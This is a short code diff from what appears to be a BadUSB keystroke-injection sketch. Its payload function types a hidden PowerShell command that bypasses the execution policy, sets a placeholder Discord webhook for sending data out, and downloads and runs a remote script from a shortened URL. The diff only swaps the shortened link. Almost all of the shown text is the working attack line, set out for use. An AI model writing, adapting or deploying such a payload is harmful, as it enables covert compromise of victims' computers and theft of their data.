@@ -10,7 +10,7 @@ void payload() {
 
   delay(300);
 
-  Keyboard.print("powershell -W h -NonI -NoP -Ep bypass -c \"$dc = '<Your discord webhook here>'; irm https://shorturl.at/blvGV | iex\"");
+  Keyboard.print("powershell -W h -NonI -NoP -Ep bypass -c \"$dc = '<Your discord webhook here>'; irm https://shorturl.at/npJOS | iex\"");
 
   delay(200);
 
